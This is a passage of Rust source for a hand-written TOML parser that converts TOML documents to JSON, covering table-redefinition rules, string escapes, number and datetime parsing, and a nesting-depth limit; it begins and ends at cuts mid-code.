    // *document*-level structure built by `[header]`/`[[header]]`/bare
    // `key = value` lines needs it, to enforce TOML's own redefinition
    // rules (verified against the official spec text and, for the
    // genuinely subtle cases prose alone left ambiguous, against
    // `toml-lang/toml-test`'s own fixtures - see the worked examples in
    // CLAUDE.md's Dependency footprint section).
    // -----------------------------------------------------------------

    #[derive(Clone)]
    enum TomlNode {
        /// A sealed leaf - a scalar, a fully-specified inline table, or a
        /// static array literal. Once set, permanently closed: can never
        /// be reassigned or navigated into from outside (matching TOML's
        /// own "inline tables are fully self-contained" rule, and a
        /// plain key/value pair's own "defining a key twice is invalid"
        /// rule).
        Value(JsonValue),
        Table(TomlTable),
        ArrayOfTables(Vec<TomlTable>),
    }

    #[derive(Clone, Default)]
    struct TomlTable {
        entries: Vec<(String, TomlNode)>,
        /// `true` once this exact table was the direct target of a
        /// `[header]` line (or is the freshest element of an
        /// `[[header]]` array). Such a table stays open to *more*
        /// `[header]`/`[[header]]` sub-table definitions nested under it
        /// (the standard "supertable" pattern - see
        /// `[fruit.apple.texture]` in the spec's own worked example, and
        /// `[x]` legally defined *after* `[x.y.z.w]` already implied it)
        /// but is permanently closed to *dotted-key* traversal reaching
        /// into it from any later statement (a real, deliberate TOML
        /// rule, not an oversight - confirmed against toml-test's own
        /// `append-with-dotted-keys-*` fixtures and their commentary,
        /// not just the spec's prose, since a first reading of the spec
        /// text alone was misleading here - see this field's sibling
        /// `dotted_owned` for the other half of the real rule).
        via_header: bool,
        /// `true` once this exact table has been the target (final
        /// segment, or an intermediate ancestor) of *any* dotted-key
        /// `a.b.c = value` statement. Unlike `via_header`, this does
        /// *not* close the table to further dotted-key traversal (`a.b`
        /// can be extended by any number of later `a.b.x = ...`/
        /// `a.b.y.z = ...` statements - a real, common, valid pattern:
        /// see the spec's own `apple.color`/`apple.taste.sweet` worked
        /// example) - it only closes the table to being *later* named by
        /// a `[header]`, which TOML forbids even though it would be
        /// logically unambiguous (see the toml-lang GitHub issue linked
        /// from toml-test's own `append-with-dotted-keys-01` fixture:
        /// "it was decided this is not valid TOML as it's too confusing/
        /// convoluted"). Both flags gate the *same* header-redefinition
        /// check (`via_header || dotted_owned`); only `via_header` gates
        /// the dotted-key-traversal check.
        dotted_owned: bool,
    }

    impl TomlTable {
        fn get_mut(&mut self, key: &str) -> Option<&mut TomlNode> {
            self.entries
                .iter_mut()
                .find(|(k, _)| k == key)
                .map(|(_, v)| v)
        }
        fn get(&self, key: &str) -> Option<&TomlNode> {
            self.entries.iter().find(|(k, _)| k == key).map(|(_, v)| v)
        }
    }

    fn table_to_json(t: &TomlTable) -> JsonValue {
        JsonValue::Object(
            t.entries
                .iter()
                .map(|(k, v)| (k.clone(), node_to_json(v)))
                .collect(),
        )
    }

    fn node_to_json(n: &TomlNode) -> JsonValue {
        match n {
            TomlNode::Value(v) => v.clone(),
            TomlNode::Table(t) => table_to_json(t),
            TomlNode::ArrayOfTables(elems) => {
                JsonValue::Array(elems.iter().map(table_to_json).collect())
            }
        }
    }

    // -----------------------------------------------------------------
    // Datetime - a small structured representation, re-serialized to
    // exactly match `toml_datetime::Datetime`'s own `Display` impl
    // (checked directly against its source, not assumed): date-and-time
    // always joined with a literal `T` regardless of whether the
    // original text used a space (RFC 3339 permits both; the reference
    // crate always normalizes to `T` on output), fractional seconds
    // right-trimmed of trailing zeros (falling back to a single `0` if
    // that trims everything), and a numeric offset always rendered
    // `+HH:MM`/`-HH:MM` (`Z` only for literal UTC).
    // -----------------------------------------------------------------

    struct TomlDate {
        year: u32,
        month: u32,
        day: u32,
    }
    struct TomlTime {
        hour: u32,
        minute: u32,
        second: Option<u32>,
        nanosecond: Option<u32>,
    }
    enum TomlOffset {
        Z,
        Minutes(i32),
    }
    struct TomlDatetime {
        date: Option<TomlDate>,
        time: Option<TomlTime>,
        offset: Option<TomlOffset>,
    }

    impl std::fmt::Display for TomlDatetime {
        fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
            if let Some(d) = &self.date {
                write!(f, "{:04}-{:02}-{:02}", d.year, d.month, d.day)?;
            }
            if let Some(t) = &self.time {
                if self.date.is_some() {
                    write!(f, "T")?;
                }
                write!(f, "{:02}:{:02}", t.hour, t.minute)?;
                let second = t.second.or(if t.nanosecond.is_some() {
                    Some(0)
                } else {
                    None
                });
                if let Some(s) = second {
                    write!(f, ":{s:02}")?;
                }
                if let Some(ns) = t.nanosecond {
                    let s = format!("{ns:09}");
                    let trimmed = s.trim_end_matches('0');
                    write!(f, ".{}", if trimmed.is_empty() { "0" } else { trimmed })?;
                }
            }
            if let Some(off) = &self.offset {
                match off {
                    TomlOffset::Z => write!(f, "Z")?,
                    TomlOffset::Minutes(mins) => {
                        let (sign, mins) = if *mins < 0 {
                            ('-', -mins)
                        } else {
                            ('+', *mins)
                        };
                        write!(f, "{sign}{:02}:{:02}", mins / 60, mins % 60)?;
                    }
                }
            }
            Ok(())
        }
    }

    // -----------------------------------------------------------------
    // Character-cursor parser
    // -----------------------------------------------------------------

    /// A conservative recursion-depth cap for nested arrays/inline
    /// tables, found necessary the same way every other nested-format
    /// depth guard in this project was: real, adversarial testing (a
    /// hand-built `[[[...]]]`-nested TOML array) genuinely stack-
    /// overflowed a debug build somewhere between 5,000 and 10,000
    /// levels (a release build survives considerably deeper, but debug
    /// builds - what `cargo test`/`cargo run` both default to - are a
    /// real, reachable environment, not a hypothetical one). 512 matches
    /// this project's own XML depth guard (`MAX_XML_DEPTH`), chosen for
    /// the same reason: comfortable margin under the empirically found
    /// danger zone, far deeper than any real TOML document would
    /// plausibly nest.
    const MAX_TOML_DEPTH: u32 = 512;

    struct P<'a> {
        s: &'a str,
        pos: usize,
        depth: u32,
    }

    fn is_bare_key_char(c: char) -> bool {
        c.is_ascii_alphanumeric() || c == '_' || c == '-'
    }

    impl<'a> P<'a> {
        fn new(s: &'a str) -> Self {
            P {
                s,
                pos: 0,
                depth: 0,
            }
        }

        fn peek(&self) -> Option<char> {
            self.s[self.pos..].chars().next()
        }
        fn peek_at(&self, offset_chars: usize) -> Option<char> {
            self.s[self.pos..].chars().nth(offset_chars)
        }
        fn bump(&mut self) -> Option<char> {
            let c = self.peek()?;
            self.pos += c.len_utf8();
            Some(c)
        }
        fn starts_with(&self, s: &str) -> bool {
            self.s[self.pos..].starts_with(s)
        }
        fn eof(&self) -> bool {
            self.pos >= self.s.len()
        }

        fn skip_ws(&mut self) {
            while matches!(self.peek(), Some(' ' | '\t')) {
                self.bump();
            }
        }

        /// Skips whitespace, comments, and blank lines - used between
        /// top-level document items.
        fn skip_ws_comments_newlines(&mut self) -> Result<()> {
            loop {
                match self.peek() {
                    Some(' ' | '\t') => {
                        self.bump();
                    }
                    Some('\r') if self.peek_at(1) == Some('\n') => {
                        self.bump();
                        self.bump();
                    }
                    Some('\n') => {
                        self.bump();
                    }
                    Some('#') => {
                        self.skip_comment()?;
                    }
                    _ => break,
                }
            }
            Ok(())
        }

        fn skip_comment(&mut self) -> Result<()> {
            self.bump(); // '#'
            loop {
                match self.peek() {
                    None | Some('\n') => break,
                    Some('\r') if self.peek_at(1) == Some('\n') => break,
                    Some(c) => {
                        let cp = c as u32;
                        if cp <= 0x08 || (0x0A..=0x1F).contains(&cp) || cp == 0x7F {
                            bail!("malformed TOML: control character not permitted in a comment");
                        }
                        self.bump();
                    }
                }
            }
            Ok(())
        }

        fn expect_newline_or_eof(&mut self) -> Result<()> {
            self.skip_ws();
            match self.peek() {
                None => Ok(()),
                Some('#') => self.skip_comment(),
                Some('\n') => {
                    self.bump();
                    Ok(())
                }
                Some('\r') if self.peek_at(1) == Some('\n') => {
                    self.bump();
                    self.bump();
                    Ok(())
                }
                Some(c) => bail!("malformed TOML: expected end of line, found '{c}'"),
            }
        }

        // -- keys --

        fn parse_key_segment(&mut self) -> Result<String> {
            self.skip_ws();
            // Keys may only be *single-line* basic/literal strings - the
            // multi-line forms are explicitly not a valid key form (see
            // toml-test's own `key/multiline-key-*` invalid fixtures).
            if self.starts_with("\"\"\"") || self.starts_with("'''") {
                bail!("malformed TOML: a multi-line string is not a valid key");
            }
            match self.peek() {
                Some('"') => self.parse_basic_string(),
                Some('\'') => self.parse_literal_string_raw(),
                Some(c) if is_bare_key_char(c) => {
                    let start = self.pos;
                    while matches!(self.peek(), Some(c) if is_bare_key_char(c)) {
                        self.bump();
                    }
                    Ok(self.s[start..self.pos].to_string())
                }
                _ => bail!("malformed TOML: expected a key"),
            }
        }

        fn parse_dotted_key(&mut self) -> Result<Vec<String>> {
            let mut parts = vec![self.parse_key_segment()?];
            loop {
                self.skip_ws();
                if self.peek() == Some('.') {
                    self.bump();
                    parts.push(self.parse_key_segment()?);
                } else {
                    break;
                }
            }
            Ok(parts)
        }

        // -- strings --

        fn read_hex_n(&mut self, n: usize) -> Result<u32> {
            let start = self.pos;
            for _ in 0..n {
                match self.peek() {
                    Some(c) if c.is_ascii_hexdigit() => {
                        self.bump();
                    }
                    _ => bail!("malformed TOML: invalid unicode escape"),
                }
            }
            u32::from_str_radix(&self.s[start..self.pos], 16)
                .ok()
                .context("malformed TOML: invalid unicode escape")
        }

        fn basic_escape(&mut self) -> Result<Option<char>> {
            match self.bump() {
                Some('b') => Ok(Some('\u{8}')),
                Some('t') => Ok(Some('\t')),
                Some('n') => Ok(Some('\n')),
                Some('f') => Ok(Some('\u{C}')),
                Some('r') => Ok(Some('\r')),
                Some('"') => Ok(Some('"')),
                Some('\\') => Ok(Some('\\')),
                Some('u') => {
                    let cp = self.read_hex_n(4)?;
                    char::from_u32(cp)
                        .map(Some)
                        .context("malformed TOML: invalid unicode scalar value")
                }
                Some('U') => {
                    let cp = self.read_hex_n(8)?;
                    char::from_u32(cp)
                        .map(Some)
                        .context("malformed TOML: invalid unicode scalar value")
                }
                // TOML 1.1.0 additions: `\e` for ESC (U+001B), and `\xHH`
                // for the first 256 code points (verified against
                // toml-test's own `string/escape-esc.toml` and
                // `string/hex-escape.toml` fixtures).
                Some('e') => Ok(Some('\u{1B}')),
                Some('x') => {
                    let cp = self.read_hex_n(2)?;
                    char::from_u32(cp)
                        .map(Some)
                        .context("malformed TOML: invalid unicode scalar value")
                }
                Some(c) => bail!("malformed TOML: invalid escape sequence '\\{c}'"),
                None => bail!("malformed TOML: unterminated escape sequence"),
            }
        }

        fn forbidden_string_control_char(c: char, allow_tab_lf_cr: bool) -> bool {
            let cp = c as u32;
            if allow_tab_lf_cr && (c == '\t' || c == '\n' || c == '\r') {
                return false;
            }
            cp <= 0x08
                || cp == 0x0B
                || cp == 0x0C
                || (0x0E..=0x1F).contains(&cp)
                || cp == 0x7F
                || (cp <= 0x1F && !allow_tab_lf_cr && c != '\t')
        }

        fn parse_basic_string(&mut self) -> Result<String> {
            if self.starts_with("\"\"\"") {
                return self.parse_multiline_basic_string();
            }
            self.bump(); // opening quote
            let mut out = String::new();
            loop {
                match self.peek() {
                    None => bail!("malformed TOML: unterminated string"),
                    Some('"') => {
                        self.bump();
                        break;
                    }
                    Some('\\') => {
                        self.bump();
                        if let Some(c) = self.basic_escape()? {
                            out.push(c);
                        }
                    }
                    Some('\n') => bail!("malformed TOML: newline in single-line string"),
                    Some(c) => {
                        if Self::forbidden_string_control_char(c, false) {
                            bail!("malformed TOML: control character not permitted in a string");
                        }
                        self.bump();
                        out.push(c);
                    }
                }
            }
            Ok(out)
        }

        fn parse_multiline_basic_string(&mut self) -> Result<String> {
            self.pos += 3; // """
            if self.peek() == Some('\r') && self.peek_at(1) == Some('\n') {
                self.pos += 2;
            } else if self.peek() == Some('\n') {
                self.bump();
            }
            let mut out = String::new();
            loop {
                match self.peek() {
                    None => bail!("malformed TOML: unterminated multi-line string"),
                    Some('"') => {
                        // Greedily count the *whole* consecutive run: up
                        // to 2 quotes may appear literally anywhere,
                        // including immediately before the closing
                        // delimiter (verified against toml-test's own
                        // `string/multiline-quotes.toml`: `""""` closes
                        // as "1 literal quote + delimiter",
                        // `"""""`/`""""""`... as "2 literal + delimiter" -
                        // but 3+ leading extras, i.e. a run of 6 or more,
                        // is invalid, per `multiline-quotes-01`'s own
                        // negative fixture - the *first* 3 of a 6-run
                        // would themselves already form a valid close,
                        // leaving 3 dangling quotes with nothing to
                        // attach to).
                        let mut n = 0usize;
                        let save = self.pos;
                        while self.peek() == Some('"') {
                            n += 1;
                            self.bump();
                        }
                        if n < 3 {
                            self.pos = save;
                            for _ in 0..n {
                                out.push('"');
                                self.bump();
                            }
                            continue;
                        }
                        if n > 5 {
                            bail!(
                                "malformed TOML: too many consecutive quotes in a multi-line string"
                            );
                        }
                        for _ in 0..(n - 3) {
                            out.push('"');
                        }
                        break;
                    }
                    Some('\r') if self.peek_at(1) != Some('\n') => {
                        bail!(
                            "malformed TOML: a lone carriage return is not permitted in a string"
                        );
                    }
                    Some('\\') => {
                        self.bump();
                        // line-ending backslash
                        let save = self.pos;
                        let mut only_ws = true;
                        let mut p = self.pos;
                        let bytes = self.s.as_bytes();
                        while p < bytes.len() {
                            let c = self.s[p..].chars().next().unwrap();
                            if c == ' ' || c == '\t' || c == '\n' || c == '\r' {
                                p += c.len_utf8();
                            } else {
                                break;
                            }
                        }
                        // Only a genuine "line ending backslash" if a newline
                        // actually appears before any non-whitespace.
                        let ahead = &self.s[self.pos..p];
                        if ahead.contains('\n') {
                            self.pos = p;
                        } else {
                            only_ws = false;
                        }
                        if !only_ws {
                            self.pos = save;
                            if let Some(c) = self.basic_escape()? {
                                out.push(c);
                            }
                        }
                    }
                    Some(c) => {
                        if Self::forbidden_string_control_char(c, true) {
                            bail!("malformed TOML: control character not permitted in a string");
                        }
                        self.bump();
                        out.push(c);
                    }
                }
            }
            Ok(out)
        }

        fn parse_literal_string_raw(&mut self) -> Result<String> {
            if self.starts_with("'''") {
                return self.parse_multiline_literal_string();
            }
            self.bump();
            let mut out = String::new();
            loop {
                match self.peek() {
                    None => bail!("malformed TOML: unterminated string"),
                    Some('\'') => {
                        self.bump();
                        break;
                    }
                    Some('\n') => bail!("malformed TOML: newline in single-line string"),
                    Some(c) => {
                        if Self::forbidden_string_control_char(c, false) {
                            bail!("malformed TOML: control character not permitted in a string");
                        }
                        self.bump();
                        out.push(c);
                    }
                }
            }
            Ok(out)
        }

        fn parse_multiline_literal_string(&mut self) -> Result<String> {
            self.pos += 3;
            if self.peek() == Some('\r') && self.peek_at(1) == Some('\n') {
                self.pos += 2;
            } else if self.peek() == Some('\n') {
                self.bump();
            }
            let mut out = String::new();
            loop {
                match self.peek() {
                    None => bail!("malformed TOML: unterminated multi-line string"),
                    Some('\'') => {
                        // See `parse_multiline_basic_string`'s identical
                        // (and identically-verified) rule above: up to 2
                        // extra literal quotes may precede the real
                        // 3-quote close; a run of 6+ is invalid.
                        let mut n = 0usize;
                        let save = self.pos;
                        while self.peek() == Some('\'') {
                            n += 1;
                            self.bump();
                        }
                        if n < 3 {
                            self.pos = save;
                            for _ in 0..n {
                                out.push('\'');
                                self.bump();
                            }
                            continue;
                        }
                        if n > 5 {
                            bail!(
                                "malformed TOML: too many consecutive quotes in a multi-line string"
                            );
                        }
                        for _ in 0..(n - 3) {
                            out.push('\'');
                        }
                        break;
                    }
                    Some('\r') if self.peek_at(1) != Some('\n') => {
                        bail!(
                            "malformed TOML: a lone carriage return is not permitted in a string"
                        );
                    }
                    Some(c) => {
                        if Self::forbidden_string_control_char(c, true) {
                            bail!("malformed TOML: control character not permitted in a string");
                        }
                        self.bump();
                        out.push(c);
                    }
                }
            }
            Ok(out)
        }

        // -- values --

        fn parse_value(&mut self) -> Result<JsonValue> {
            self.skip_ws();
            match self.peek() {
                Some('"') => self.parse_basic_string().map(JsonValue::String),
                Some('\'') => self.parse_literal_string_raw().map(JsonValue::String),
                Some('[') => self.parse_array(),
                Some('{') => self.parse_inline_table(),
                Some('t') if self.starts_with("true") => {
                    self.pos += 4;
                    Ok(JsonValue::Bool(true))
                }
                Some('f') if self.starts_with("false") => {
                    self.pos += 5;
                    Ok(JsonValue::Bool(false))
                }
                Some(_) => self.parse_number_or_datetime(),
                None => bail!("malformed TOML: expected a value"),
            }
        }

        fn parse_array(&mut self) -> Result<JsonValue> {
            self.bump(); // [
            self.depth += 1;
            if self.depth > MAX_TOML_DEPTH {
                bail!("malformed TOML: nested more than {MAX_TOML_DEPTH} levels deep");
            }
            let mut items = Vec::new();
            loop {
                self.skip_array_ws()?;
                if self.peek() == Some(']') {
                    self.bump();
                    break;
                }
                items.push(self.parse_value()?);
                self.skip_array_ws()?;
                match self.peek() {
                    Some(',') => {
                        self.bump();
                    }
                    Some(']') => {
                        self.bump();
                        break;
                    }
                    _ => bail!("malformed TOML: expected ',' or ']' in array"),
                }
            }
            self.depth -= 1;
            Ok(JsonValue::Array(items))
        }

        fn skip_array_ws(&mut self) -> Result<()> {
            loop {
                match self.peek() {
                    Some(' ' | '\t' | '\n') => {
                        self.bump();
                    }
                    Some('\r') if self.peek_at(1) == Some('\n') => {
                        self.bump();
                        self.bump();
                    }
                    Some('#') => self.skip_comment()?,
                    _ => break,
                }
            }
            Ok(())
        }

        /// TOML 1.1.0 relaxes the original "single line only, no
        /// trailing comma" inline-table restriction to allow both -
        /// verified against toml-test's own `inline-table/newline*` and
        /// `key/empty-05` valid fixtures, which exercise exactly this.
        fn parse_inline_table(&mut self) -> Result<JsonValue> {
            self.bump(); // {
            self.depth += 1;
            if self.depth > MAX_TOML_DEPTH {
                bail!("malformed TOML: nested more than {MAX_TOML_DEPTH} levels deep");
            }
            let mut table = TomlTable::default();
            self.skip_array_ws()?;
            if self.peek() != Some('}') {
                loop {
                    self.skip_array_ws()?;
                    let path = self.parse_dotted_key()?;
                    self.skip_ws();
                    if self.bump() != Some('=') {
                        bail!("malformed TOML: expected '=' in inline table");
                    }
                    self.skip_ws();
                    let value = self.parse_value()?;
                    set_dotted(&mut table, &path, TomlNode::Value(value))?;
                    self.skip_array_ws()?;
                    match self.peek() {
                        Some(',') => {
                            self.bump();
                            self.skip_array_ws()?;
                            if self.peek() == Some('}') {
                                break;
                            }
                        }
                        Some('}') => break,
                        _ => bail!("malformed TOML: expected ',' or '}}' in inline table"),
                    }
                }
            }
            self.bump(); // }
            self.depth -= 1;
            Ok(table_to_json(&table))
        }

        /// Grabs the maximal run of number/datetime-token characters,
        /// including the one special case where a *local date* is
        /// immediately followed by a single space and then a time (the
        /// RFC 3339 space-instead-of-`T` allowance) - checked for
        /// specifically rather than folding space into the generic
        /// token charset, since a bare space is otherwise a genuine
        /// value/array/inline-table separator.
        fn read_value_token(&mut self) -> String {
            let start = self.pos;
            let is_tok =
                |c: char| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.' | '_' | ':');
            while matches!(self.peek(), Some(c) if is_tok(c)) {
                self.bump();
            }
            let core = &self.s[start..self.pos];
            if core.len() == 10
                && core.as_bytes()[4] == b'-'
                && core.as_bytes()[7] == b'-'
                && core
                    .bytes()
                    .enumerate()
                    .all(|(i, b)| i == 4 || i == 7 || b.is_ascii_digit())
                && self.peek() == Some(' ')
                && let Some(c2) = self.peek_at(1)
                && c2.is_ascii_digit()
            {
                self.bump(); // the space
                while matches!(self.peek(), Some(c) if is_tok(c)) {
                    self.bump();
                }
            }
            self.s[start..self.pos].to_string()
        }

        fn parse_number_or_datetime(&mut self) -> Result<JsonValue> {
            if self.starts_with("+inf") || self.starts_with("-inf") {
                let neg = self.peek() == Some('-');
                self.pos += 4;
                return Ok(f64_to_json(if neg {
                    f64::NEG_INFINITY
                } else {
                    f64::INFINITY
                }));
            }
            if self.starts_with("inf") {
                self.pos += 3;
                return Ok(f64_to_json(f64::INFINITY));
            }
            if self.starts_with("+nan") || self.starts_with("-nan") {
                self.pos += 4;
                return Ok(f64_to_json(f64::NAN));
            }
            if self.starts_with("nan") {
                self.pos += 3;
                return Ok(f64_to_json(f64::NAN));
            }
            if self.starts_with("0x") || self.starts_with("0o") || self.starts_with("0b") {
                return self.parse_radix_int();
            }

            let token = self.read_value_token();
            if token.is_empty() {
                bail!("malformed TOML: expected a value");
            }
            classify_number_or_datetime(&token)
        }

        fn parse_radix_int(&mut self) -> Result<JsonValue> {
            let radix = match self.peek_at(1) {
                Some('x') => 16,
                Some('o') => 8,
                Some('b') => 2,
                _ => unreachable!(),
            };
            self.pos += 2;
            let start = self.pos;
            while matches!(self.peek(), Some(c) if c.is_ascii_hexdigit() || c == '_') {
                self.bump();
            }
            let raw = &self.s[start..self.pos];
            let digits: String = raw.chars().filter(|&c| c != '_').collect();
            if digits.is_empty() || raw.starts_with('_') || raw.ends_with('_') || raw.contains("__")
            {
                bail!("malformed TOML: invalid integer literal");
            }
            let v = i64::from_str_radix(&digits, radix)
                .or_else(|_| u64::from_str_radix(&digits, radix).map(|u| u as i64))
                .context("malformed TOML: integer literal out of range")?;
            Ok(JsonValue::from(v))
        }
    }

    fn f64_to_json(f: f64) -> JsonValue {
        serde_json::Number::from_f64(f).map_or(JsonValue::Null, JsonValue::Number)
    }

    fn valid_underscored_digits(s: &str, digit_ok: impl Fn(char) -> bool) -> Option<String> {
        if s.is_empty() || s.starts_with('_') || s.ends_with('_') || s.contains("__") {
            return None;
        }
        let mut out = String::new();
        for c in s.chars() {
            if c == '_' {
                continue;
            }
            if !digit_ok(c) {
                return None;
            }
            out.push(c);
        }
        if out.is_empty() { None } else { Some(out) }
    }

    /// Classifies an already-extracted value token as an integer, float,
    /// or one of the four datetime shapes - verified against the spec's
    /// own ABNF-described character positions (year/month/day/hour/
    /// minute/second field widths, the fractional-seconds/offset
    /// suffixes) rather than a general date-parsing library.
    fn classify_number_or_datetime(token: &str) -> Result<JsonValue> {
        let bytes = token.as_bytes();

        // Local Date: exactly YYYY-MM-DD.
        let looks_like_date = bytes.len() >= 10
            && bytes[4] == b'-'
            && bytes[7] == b'-'
            && bytes[0..4].iter().all(u8::is_ascii_digit)
            && bytes[5..7].iter().all(u8::is_ascii_digit)
            && bytes[8..10].iter().all(u8::is_ascii_digit);

        if looks_like_date {
            let year: u32 = token[0..4].parse().unwrap();
            let month: u32 = token[5..7].parse().unwrap();
            let day: u32 = token[8..10].parse().unwrap();
            validate_date(year, month, day)?;
            let date = TomlDate { year, month, day };
            if token.len() == 10 {
                return Ok(JsonValue::String(
                    TomlDatetime {
                        date: Some(date),
                        time: None,
                        offset: None,
                    }
                    .to_string(),
                ));
            }
            // Date + time, joined by 'T'/'t'/' '.
            let sep = token.as_bytes()[10];
            if sep != b'T' && sep != b't' && sep != b' ' {
                bail!("malformed TOML: invalid datetime '{token}'");
            }
            let (time, offset) = parse_time_and_offset(&token[11..])?;
            return Ok(JsonValue::String(
                TomlDatetime {
                    date: Some(date),
                    time: Some(time),
                    offset,
                }
                .to_string(),
            ));
        }

        // Local Time: HH:MM[:SS[.frac]] (no date, no offset) - seconds
        // are optional since TOML 1.1.0.
        let looks_like_time = bytes.len() >= 5
            && bytes[2] == b':'
            && bytes[0..2].iter().all(u8::is_ascii_digit)
            && bytes[3..5].iter().all(u8::is_ascii_digit);
        if looks_like_time {
            let (time, offset) = parse_time_and_offset(token)?;
            if offset.is_some() {
                bail!("malformed TOML: a local time cannot have a timezone offset");
            }
            return Ok(JsonValue::String(
                TomlDatetime {
                    date: None,
                    time: Some(time),
                    offset: None,
                }
                .to_string(),
            ));
        }

        // Otherwise: integer or float.
        parse_int_or_float(token)
    }

    fn validate_date(year: u32, month: u32, day: u32) -> Result<()> {
        if !(1..=12).contains(&month) {
            bail!("malformed TOML: invalid month in date");
        }
        let max_day = match month {
            1 | 3 | 5 | 7 | 8 | 10 | 12 => 31,
            4 | 6 | 9 | 11 => 30,
            2 => {
                let leap = (year.is_multiple_of(4) && !year.is_multiple_of(100))
                    || year.is_multiple_of(400);
                if leap { 29 } else { 28 }
            }
            _ => unreachable!(),
        };
        if day == 0 || day > max_day {
            bail!("malformed TOML: invalid day in date");
        }
        Ok(())
    }

    fn parse_time_and_offset(s: &str) -> Result<(TomlTime, Option<TomlOffset>)> {
        let bytes = s.as_bytes();
        if bytes.len() < 5
            || bytes[2] != b':'
            || !bytes[0].is_ascii_digit()
            || !bytes[1].is_ascii_digit()
            || !bytes[3].is_ascii_digit()
            || !bytes[4].is_ascii_digit()
        {
            bail!("malformed TOML: invalid time '{s}'");
        }
        let hour: u32 = s[0..2].parse().context("malformed TOML: invalid hour")?;
        let minute: u32 = s[3..5].parse().context("malformed TOML: invalid minute")?;
        if hour > 23 || minute > 59 {
            bail!("malformed TOML: time field out of range");
        }
        let mut rest = &s[5..];
        let mut second = None;
        let mut nanosecond = None;
        // Seconds are optional (TOML 1.1.0) - `HH:MM` alone is valid.
        if let Some(after_colon) = rest.strip_prefix(':') {
            let sbytes = after_colon.as_bytes();
            if sbytes.len() < 2 || !sbytes[0].is_ascii_digit() || !sbytes[1].is_ascii_digit() {
                bail!("malformed TOML: invalid second in '{s}'");
            }
            let sec: u32 = after_colon[0..2]
                .parse()
                .context("malformed TOML: invalid second")?;
            if sec > 60 {
                bail!("malformed TOML: time field out of range");
            }
            second = Some(sec);
            rest = &after_colon[2..];
            if let Some(frac) = rest.strip_prefix('.') {
                let end = frac
                    .find(|c: char| !c.is_ascii_digit())
                    .unwrap_or(frac.len());
                let digits = &frac[..end];
                if digits.is_empty() {
                    bail!("malformed TOML: invalid fractional seconds");
                }
                let truncated = &digits[..digits.len().min(9)];
                let padded = format!("{truncated:0<9}");
                nanosecond = Some(
                    padded
                        .parse::<u32>()
                        .context("malformed TOML: invalid fractional seconds")?,
                );
                rest = &frac[end..];
            }
        }
        let time = TomlTime {
            hour,
            minute,
            second,
            nanosecond,
        };

        let offset = if rest.is_empty() {
            None
        } else if rest == "Z" || rest == "z" {
            Some(TomlOffset::Z)
        } else {
            let rbytes = rest.as_bytes();
            if rbytes.len() != 6 || (rbytes[0] != b'+' && rbytes[0] != b'-') || rbytes[3] != b':' {
                bail!("malformed TOML: invalid timezone offset '{rest}'");
            }
            let sign = if rbytes[0] == b'-' { -1 } else { 1 };
            let oh: i32 = rest[1..3]
                .parse()
                .context("malformed TOML: invalid offset hour")?;
            let om: i32 = rest[4..6]
                .parse()
                .context("malformed TOML: invalid offset minute")?;
            if oh > 23 || om > 59 {
                bail!("malformed TOML: timezone offset out of range");
            }
            Some(TomlOffset::Minutes(sign * (oh * 60 + om)))
        };
        Ok((time, offset))
    }

    fn parse_int_or_float(token: &str) -> Result<JsonValue> {
        let (sign, unsigned) = match token.strip_prefix('-') {
            Some(rest) => ("-", rest),
            None => match token.strip_prefix('+') {
                Some(rest) => ("", rest),
                None => ("", token),
            },
        };
        let is_float = unsigned.contains('.') || unsigned.contains('e') || unsigned.contains('E');

        if !is_float {
            let digits = valid_underscored_digits(unsigned, |c| c.is_ascii_digit())
                .with_context(|| format!("malformed TOML: invalid integer '{token}'"))?;
            if digits.len() > 1 && digits.starts_with('0') {
                bail!("malformed TOML: leading zeros are not allowed in integers ('{token}')");
            }
            let full = format!("{sign}{digits}");
            let v: i64 = full
                .parse()
                .with_context(|| format!("malformed TOML: integer '{token}' out of range"))?;
            return Ok(JsonValue::from(v));
        }

        // Float: intpart ['.' fracpart] [('e'|'E') exppart]
        let (mantissa, exp) = match unsigned.split_once(['e', 'E']) {
            Some((m, e)) => (m, Some(e)),
            None => (unsigned, None),
        };
        let (int_part, frac_part) = match mantissa.split_once('.') {
            Some((i, f)) => (i, Some(f)),
            None => (mantissa, None),
        };
        let int_digits = valid_underscored_digits(int_part, |c| c.is_ascii_digit())
            .with_context(|| format!("malformed TOML: invalid float '{token}'"))?;
        if int_digits.len() > 1 && int_digits.starts_with('0') {
            bail!("malformed TOML: leading zeros are not allowed in floats ('{token}')");
        }
        let mut rebuilt = format!("{sign}{int_digits}");
        if let Some(f) = frac_part {
            let frac_digits = valid_underscored_digits(f, |c| c.is_ascii_digit())
                .with_context(|| format!("malformed TOML: invalid float '{token}'"))?;
            rebuilt.push('.');
            rebuilt.push_str(&frac_digits);
        }
        if let Some(e) = exp {
            let (esign, eu) = match e.strip_prefix('-') {
                Some(r) => ("-", r),
                None => match e.strip_prefix('+') {
                    Some(r) => ("+", r),
                    None => ("+", e),
                },
            };
            let edigits = valid_underscored_digits(eu, |c| c.is_ascii_digit())
                .with_context(|| format!("malformed TOML: invalid float exponent '{token}'"))?;
            rebuilt.push('e');
            rebuilt.push_str(esign);
            rebuilt.push_str(&edigits);
        }
        let v: f64 = rebuilt
            .parse()
            .with_context(|| format!("malformed TOML: invalid float '{token}'"))?;
        Ok(f64_to_json(v))
    }

    // -----------------------------------------------------------------
    // Path resolution against the document tree
    // -----------------------------------------------------------------

    /// Walks a dotted key `path` from `root` (the LHS of a `key = value`
    /// statement - top-level or inside an inline table), creating
    /// ancestor tables as needed and setting the final segment to
    /// `value`. Every table segment touched (ancestor or final parent)
    /// gets `dotted_owned = true` (closing it to a *later* `[header]`,
    /// but not to more dotted-key extension); walking through a table
    /// with `via_header = true` is TOML's own deliberate error (see
    /// `TomlTable::via_header`'s doc comment) - dotted keys can never
    /// reach into an already `[header]`-defined table, even though the
    /// *header* form can always walk through anything.
    fn set_dotted(root: &mut TomlTable, path: &[String], value: TomlNode) -> Result<()> {
        let mut cur = root;
        for (i, seg) in path.iter().enumerate() {
            let last = i == path.len() - 1;
            if last {
                if cur.get(seg).is_some() {
                    bail!("malformed TOML: duplicate key '{seg}'");
                }
                cur.entries.push((seg.clone(), value));
                return Ok(());
            }
            if cur.get(seg).is_none() {
                cur.entries.push((
                    seg.clone(),
                    TomlNode::Table(TomlTable {
                        dotted_owned: true,
                        ..TomlTable::default()
                    }),
                ));
            }
            match cur.get_mut(seg).unwrap() {
                TomlNode::Table(t) => {
                    if t.via_header {
                        bail!(
